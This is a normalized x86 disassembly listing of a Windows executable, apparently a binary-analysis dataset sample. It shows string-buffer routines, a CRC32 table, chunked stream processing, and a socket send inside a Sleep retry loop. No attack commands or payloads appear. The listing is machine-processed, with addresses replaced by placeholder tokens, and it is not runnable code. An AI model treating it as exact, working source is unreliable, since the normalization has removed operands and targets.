sub_401010
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_417912#2
add esp 0x4
sub_401060
push ebp
mov ebp esp
mov eax [ ecx ]
sub esp 0x8
lea edx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push edx
call [ eax + 0xc ]
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
xor al al
mov esp ebp
pop ebp
retn 0x8
mov eax [ eax ]
cmp eax [ edx ]
jne r-xdata
mov al 0x1
mov esp ebp
pop ebp
retn 0x8
sub_4010a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor al al
pop ebp
retn 0x8
mov eax [ eax ]
cmp eax [ ebp + 0xc ]
jne r-xdata
mov al 0x1
pop ebp
retn 0x8
sub_4010d0
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
call sub_4166e8
mov esi [ ebp + 0x8 ]
add esp 0x4
test eax eax
mov edx r--data
cmovne edx eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edx ] 0x0
jne r-xdata
mov ecx edx
push edi
lea edi [ ecx + 0x1 ]
xor ecx ecx
push ecx
push edx
mov ecx esi
call sub_401630
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
pop edi
push ecx
push edx
mov ecx esi
call sub_401630
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_401150
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
cmp eax 0x1
jne r-xdata
push eax
push esi
call sub_4010d0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
push 0x15
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push r--data
mov ecx esi
mov [ esi ] 0x0
call sub_401630
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_4011b0
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
call sub_416712
mov esi [ ebp + 0x8 ]
add esp 0x4
test eax eax
mov edx r--data
cmovne edx eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edx ] 0x0
jne r-xdata
mov ecx edx
push edi
lea edi [ ecx + 0x1 ]
xor ecx ecx
push ecx
push edx
mov ecx esi
call sub_401630
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
pop edi
push ecx
push edx
mov ecx esi
call sub_401630
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_401220
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_4166e8
add esp 0x4
test eax eax
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
je r-xdata
mov [ eax + 0x4 ] rw-data
pop esi
pop ebp
retn 0x8
mov [ eax + 0x4 ] rw-data
pop esi
pop ebp
retn 0x8
sub_401260
push ebp
mov ebp esp
push 0xffffffff
push sub_4301c8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov [ ebp - 0x44 ] eax
mov ecx [ ebp + 0x14 ]
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
add eax 0x4
push 0x4
mov [ ebp - 0x54 ] ecx
push r--data
mov ecx eax
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x50 ] 0x0
mov [ ebp - 0x48 ] eax
call sub_401630
mov eax [ ebp - 0x44 ]
sub esp 0x18
mov ecx esp
push 0xffffffff
mov [ eax + 0x1c ] 0x0
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push esi
mov [ ecx ] 0x0
call sub_401500
push [ ebp - 0x44 ]
lea eax [ ebp - 0x50 ]
push eax
push [ edi ]
lea ecx [ ebp - 0x40 ]
call sub_40fea0
push 0xffffffff
push 0x0
test al al
jne r-xdata
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_401500
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x10
lea ecx [ ebp - 0x28 ]
cmovae ecx [ ebp - 0x28 ]
cmp [ ebp - 0x2c ] 0x0
je r-xdata
push [ ebp - 0x48 ]
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] 0x0
mov ecx ebx
mov [ ebx ] al
call sub_401500
jmp r-xdata
mov edi [ Sleep@IAT ]
mov ebx [ ebp - 0x44 ]
mov esi 0x1
jmp r-xdata
mov eax [ ebp - 0x18 ]
push 0x0
inc eax
push eax
push ecx
push [ ebp - 0x30 ]
call [ Ordinal_WSOCK32_19@IAT ]
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x10
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4c ]
je r-xdata
push 0x64
call edi
inc esi
cmp esi 0x64
jle r-xdata
mov esi 0x64
nop
push 0x8
push r--data
lea ecx [ ebp - 0x28 ]
call sub_401630
cmp [ ebp - 0x14 ] 0x10
lea ecx [ ebp - 0x28 ]
cmovae ecx [ ebp - 0x28 ]
cmp [ ebp - 0x2c ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
push 0x64
call edi
dec esi
jne r-xdata
push 0xffffffff
push esi
push [ ebp - 0x48 ]
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] esi
mov ecx ebx
mov [ ebx ] 0x0
call sub_401500
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov eax [ ebp - 0x18 ]
push 0x0
inc eax
push eax
push ecx
push [ ebp - 0x30 ]
call [ Ordinal_WSOCK32_19@IAT ]
push [ ebp - 0x28 ]
call j_sub_417912#2
add esp 0x4
sub_401430
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ ecx ] 0x0
jne r-xdata
mov edx ecx
push edi
lea edi [ edx + 0x1 ]
xor edx edx
push edx
push ecx
mov ecx esi
call sub_401630
mov eax esi
pop esi
pop ebp
retn 0x4
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx edi
pop edi
push edx
push ecx
mov ecx esi
call sub_401630
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4014c0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
jne r-xdata
mov edx esi
push edi
lea edi [ edx + 0x1 ]
xor edx edx
push edx
push esi
call sub_401630
pop esi
pop ebp
retn 0x4
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx edi
pop edi
push edx
push esi
call sub_401630
pop esi
pop ebp
retn 0x4
sub_401500
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebx + 0x10 ]
mov esi ecx
mov ecx [ ebp + 0xc ]
cmp edi ecx
jb r-xdata
push r--data
call sub_41685b
sub edi ecx
cmp [ ebp + 0x10 ] edi
cmovb edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
cmp edi 0xfffffffe
ja r-xdata
lea eax [ edi + ecx ]
cmp [ esi + 0x10 ] eax
jb r-xdata
push r--data
call sub_41682d
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_41685b
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
jb r-xdata
test edi edi
jne r-xdata
push [ esi + 0x10 ]
mov ecx esi
push edi
call sub_4018d0
mov ecx [ ebp + 0xc ]
test edi edi
je r-xdata
push ecx
mov edx esi
push 0x0
mov ecx esi
mov [ eax + edx ] 0x0
call sub_401730
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx [ esi ]
push ecx
push 0x0
mov ecx esi
mov [ eax + edx ] 0x0
call sub_401730
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ebx [ ebx ]
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
push edi
lea eax [ ebx + ecx ]
push eax
push edx
call sub_41a1a0
add esp 0xc
test edi edi
je r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
sub_401630
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi 0xfffffffe
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
push r--data
call sub_41682d
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push [ esi + 0x10 ]
mov ecx esi
push edi
call sub_4018d0
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x10 ]
add eax edx
cmp eax ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
push edi
push ebx
push eax
call sub_41a1a0
add esp 0xc
test edi edi
je r-xdata
push [ ebp + 0xc ]
mov eax esi
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_401500
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
push [ ebp + 0xc ]
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_401500
pop esi
pop ebx
pop ebp
retn 0x8
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_401730
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x10 ]
cmp edi ecx
jb r-xdata
push r--data
call sub_41685b
mov edx [ ebp + 0xc ]
mov eax edi
sub eax ecx
cmp eax edx
ja r-xdata
test edx edx
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ecx
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
pop edi
mov [ eax + ecx ] 0x0
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax + ecx ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
pop ebx
jb r-xdata
push eax
lea eax [ ebx + edx ]
push eax
push ebx
call sub_4170d0
add esp 0xc
sub edi edx
push ebx
lea ebx [ eax + ecx ]
mov eax edi
sub eax ecx
je r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub_4017d0
push ebp
mov ebp esp
cmp [ ecx + 0x14 ] 0x10
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] edx
jb r-xdata
mov [ ecx + edx ] 0x0
pop ebp
retn 0x4
mov eax [ ecx ]
mov [ eax + edx ] 0x0
pop ebp
retn 0x4
sub_401800
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xfffffffe
ja r-xdata
push r--data
call sub_41682d
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ esi + 0x10 ]
push edi
call sub_4018d0
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
pop ebp
retn 0x8
test edi edi
jne r-xdata
cmp edi 0x10
jae r-xdata
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
pop ebp
retn 0x8
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
push ebx
mov ebx [ esi + 0x10 ]
cmp edi ebx
cmovb ebx edi
cmp eax 0x10
jb r-xdata
mov [ esi ] 0x0
mov esi [ esi ]
mov [ esi + 0x10 ] ebx
xor eax eax
mov [ esi + 0x14 ] 0xf
mov [ ebx + esi ] 0x0
cmp eax edi
pop ebx
sbb eax eax
pop edi
neg eax
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov [ ebp + 0xc ] eax
test ebx ebx
je r-xdata
push eax
call j_sub_417912#2
add esp 0x4
push ebx
push eax
push esi
call sub_41a1a0
mov eax [ ebp + 0xc ]
add esp 0xc
sub_4018d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4301f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x18 ] esi
mov eax [ ebp + 0x8 ]
mov edi eax
or edi 0xf
cmp edi 0xfffffffe
jbe r-xdata
mov ebx [ esi + 0x14 ]
mov eax 0xaaaaaaab
mul edi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov edi eax
jmp r-xdata
lea ecx [ edi + 0x1 ]
xor eax eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
test ecx ecx
je r-xdata
mov eax 0xfffffffe
sub eax ecx
lea edi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
cmp ecx 0xffffffff
ja r-xdata
mov edi 0xfffffffe
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
call sub_4167fc
push ecx
call sub_41775f
add esp 0x4
mov [ ebp - 0x14 ] eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] 0x0
mov [ esi ] eax
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
cmp edi 0x10
jb r-xdata
push [ esi ]
call j_sub_417912#2
add esp 0x4
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov [ esi + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi eax
push ebx
push ecx
push eax
call sub_41a1a0
add esp 0xc
test ebx ebx
je r-xdata
sub_4019a2
mov esi [ ebp - 0x18 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_41a87b
mov ecx esi
test ebx ebx
je r-xdata
push [ esi ]
call j_sub_417912#2
add esp 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push ebx
push ecx
push eax
call sub_41a1a0
add esp 0xc
mov eax [ ebp - 0x14 ]
mov [ esi ] 0x0
mov [ esi ] eax
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
cmp edi 0x10
jb r-xdata
push [ esi ]
call j_sub_417912#2
add esp 0x4
mov [ esi + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi eax
sub_401a20
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebp
retn 0x4
cmp eax 0xffffffff
ja r-xdata
call sub_4167fc
push eax
call sub_41775f
mov ecx eax
add esp 0x4
test ecx ecx
je r-xdata
sub_401a90
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi ecx
mov [ esi + 0x4 ] 0x0
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push edi
push eax
mov eax [ eax ]
call eax
add esp 0x8
mov [ esi ] eax
test eax eax
je r-xdata
pop edi
mov [ esi ] edx
lea eax [ edx + 0x1 ]
pop esi
pop ebp
retn
pop edi
xor eax eax
pop esi
pop ebp
retn
mov [ esi + 0x4 ] edi
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_401ae0
push ebp
mov ebp esp
sub esp 0x24
xor eax eax
push ebx
push esi
push edi
jmp r-xdata
mov edx eax
and edx 0x1
dec edx
not edx
and edx 0xedb88320
mov ecx eax
shr ecx 0x1
xor edx ecx
mov ecx edx
and ecx 0x1
dec ecx
not ecx
and ecx 0xedb88320
shr edx 0x1
xor ecx edx
mov edx ecx
and edx 0x1
dec edx
shr ecx 0x1
not edx
and edx 0xedb88320
xor edx ecx
mov ecx edx
and ecx 0x1
dec ecx
not ecx
and ecx 0xedb88320
shr edx 0x1
xor ecx edx
mov edx ecx
and edx 0x1
dec edx
shr ecx 0x1
not edx
and edx 0xedb88320
xor edx ecx
mov ecx edx
and ecx 0x1
dec ecx
not ecx
and ecx 0xedb88320
shr edx 0x1
xor ecx edx
mov edx ecx
and edx 0x1
dec edx
shr ecx 0x1
not edx
and edx 0xedb88320
xor edx ecx
mov ecx edx
and ecx 0x1
dec ecx
not ecx
and ecx 0xedb88320
shr edx 0x1
xor ecx edx
mov [ eax * 4 + rw-data ] ecx
inc eax
cmp eax 0x100
jb r-xdata
cmp eax 0x800
jae r-xdata
lea ecx [ ebp - 0x20 ]
mov [ rw-data ] sub_401c80
call sub_406270
test eax eax
je r-xdata
lea esp [ esp ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x10 ]
mov esi edi
shr esi 0x8
shr edi 0x4
and esi 0xff00f
and edi 0xf00f
xor ecx ecx
mov eax rw-data
xor edx edx
lea ecx [ ecx ]
mov edx [ eax * 4 + rw-data ]
movzx ecx dl
shr edx 0x8
xor edx [ ecx * 4 + rw-data ]
inc eax
mov [ eax * 4 + rw-data ] edx
cmp eax 0x800
jb r-xdata
add edx 0xc
inc ecx
add eax 0xc
cmp edx 0x24
jb r-xdata
mov ebx [ ebp - 0x18 ]
cmp [ eax - 0x4 ] ebx
mov ebx [ ebp - 0x14 ]
jne r-xdata
mov ebx [ ebp - 0x1c ]
cmp [ eax - 0x8 ] ebx
jne r-xdata
or ecx 0xffffffff
cmp [ eax ] ebx
je r-xdata
cmp esi 0x6
jb r-xdata
dec ecx
je r-xdata
sub ecx 0x0
je r-xdata
jne r-xdata
cmp esi 0x5
jb r-xdata
dec ecx
jne r-xdata
mov [ rw-data ] sub_401d20
cmp edi 0x100c
jne r-xdata
cmp esi 0x6
jb r-xdata
cmp edi 0x6
jb r-xdata
jne r-xdata
cmp edi 0xa
jmp r-xdata
cmp edi 0xf
jb r-xdata
je r-xdata
mov [ rw-data ] sub_401d20
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_401c80
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
mov ebx edx
test esi esi
je r-xdata
cmp esi 0x4
jb r-xdata
test bl 0x3
je r-xdata
test esi esi
je r-xdata
mov eax esi
shr eax 0x2
mov [ ebp + 0x8 ] eax
movzx eax [ ebx ]
xor eax ecx
and eax 0xff
shr ecx 0x8
xor ecx [ edi + eax * 4 ]
inc ebx
dec esi
jne r-xdata
pop edi
pop esi
mov eax ecx
pop ebx
pop ebp
retn 0x8
mov edi edi
xor ecx [ ebx ]
sub esi 0x4
mov edx ecx
shr edx 0x8
and edx 0xff
mov eax ecx
mov edx [ edi + edx * 4 + 0x800 ]
shr eax 0x10
and eax 0xff
add ebx 0x4
xor edx [ edi + eax * 4 + 0x400 ]
movzx eax cl
shr ecx 0x18
xor edx [ edi + eax * 4 + 0xc00 ]
xor edx [ edi + ecx * 4 ]
dec [ ebp + 0x8 ]
mov ecx edx
jne r-xdata
movzx eax [ ebx ]
xor eax ecx
and eax 0xff
shr ecx 0x8
xor ecx [ edi + eax * 4 ]
lea ebx [ ebx + 0x1 ]
dec esi
jne r-xdata
sub_401d30
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
push eax
push [ ecx + 0x14 ]
mov edi edx
mov edx [ ecx + 0x10 ]
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x90 ] eax
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x74 ] 0x0
call sub_407eb0
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x70 ] esi
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x38 ] 0x1
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x34 ] 0x1
mov [ ebp - 0x88 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x40000
test eax eax
ja r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ edi ]
push edi
call eax
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
jb r-xdata
push [ ebp - 0x74 ]
mov eax [ ebp - 0x90 ]
push eax
mov eax [ eax + 0x4 ]
call eax
add esp 0x8
mov eax esi
mov eax [ ebp - 0xc ]
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x8c ] eax
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x98 ] eax
lea eax [ ebp - 0x94 ]
push eax
push 0x1
lea eax [ ebp - 0x8c ]
push eax
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x84 ]
call sub_407bc0
mov esi eax
mov eax [ ebp - 0x8c ]
sub [ ebp - 0xc ] eax
add esp 0x10
sub ebx eax
sbb [ ebp - 0x88 ] 0x0
test esi esi
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp ebx 0x40000
jae r-xdata
mov ecx [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
cmp ecx edx
je r-xdata
cmp edx [ ebp + 0x14 ]
jne r-xdata
test eax eax
jne r-xdata
mov esi 0x1
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push eax
mov eax [ edi + 0x4 ]
push edi
call eax
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
cmp [ ebp - 0x98 ] ecx
je r-xdata
mov eax [ ebp - 0x94 ]
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x88 ]
jmp r-xdata
cmp eax 0x4
je r-xdata
sub_401ed0
push ebp
mov ebp esp
sub esp 0xb8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ecx + 0x14 ] 0x1
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi edx
mov [ ebp - 0xac ] eax
mov [ ebp - 0x8c ] 0x0
mov [ ebp - 0x90 ] 0x0
je r-xdata
push eax
mov eax [ ecx + 0x10 ]
lea ecx [ ebp - 0xa0 ]
mov dl [ eax ]
call sub_406350
add esp 0x4
test eax eax
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x14 ]
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x8c ] esi
mov [ ebp - 0x78 ] eax
call sub_4063c0
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0xa4 ] eax
jmp r-xdata
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x40000
test eax eax
ja r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ edi ]
push edi
call eax
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
jb r-xdata
push [ ebp - 0x90 ]
mov eax [ ebp - 0xac ]
push eax
mov eax [ eax + 0x4 ]
call eax
add esp 0x8
mov eax esi
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0x14 ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0x7c ]
mov [ ebp - 0xb4 ] eax
lea eax [ ebp - 0xb0 ]
push eax
push ecx
lea eax [ ebp - 0xa8 ]
push eax
push [ ebp - 0xc ]
lea ecx [ ebp - 0xa0 ]
call sub_406550
mov esi eax
mov eax [ ebp - 0xa8 ]
sub [ ebp - 0x8 ] eax
add esp 0x10
sub ebx eax
sbb [ ebp - 0xa4 ] 0x0
test esi esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx 0x40000
jae r-xdata
mov ecx [ ebp - 0x7c ]
mov edx [ ebp - 0x78 ]
cmp ecx edx
je r-xdata
cmp edx [ ebp + 0x14 ]
jne r-xdata
test eax eax
jne r-xdata
mov esi 0x1
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push eax
mov eax [ edi + 0x4 ]
push edi
call eax
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
cmp [ ebp - 0xb4 ] ecx
je r-xdata
cmp [ ebp - 0xb0 ] 0x1
je r-xdata
mov eax [ ebp - 0xa4 ]
jmp r-xdata
sub_402070
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x10 ] edx
mov ebx ecx
test edi edi
jne r-xdata
mov [ ebp - 0x8 ] 0x40000
test edi edi
ja r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
push ebx
call eax
add esp 0xc
test eax eax
jne r-xdata
jb r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov [ ebp - 0x8 ] esi
cmp esi 0x40000
jae r-xdata
mov eax 0x6
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
call sub_41a1a0
mov eax [ ebp - 0x8 ]
add [ ebp - 0x10 ] eax
push eax
sub esi eax
mov eax [ ebx + 0x4 ]
push ebx
sbb edi 0x0
call eax
add esp 0x14
test eax eax
jne r-xdata
test edi edi
ja r-xdata
jb r-xdata
test esi esi
jne r-xdata
sub_402130
cmp [ ecx ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ ecx + 0x4 ] 0x1
jne r-xdata
cmp [ ecx + 0xc ] 0x0
ja r-xdata
jb r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
cmp [ ecx + 0x8 ] 0xffffffff
ja r-xdata
mov eax 0x1
retn
cmp eax 0x21
je r-xdata
cmp eax 0x30101
jne r-xdata
sub_402170
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
cmp eax 0x1
jb r-xdata
mov eax 0x4
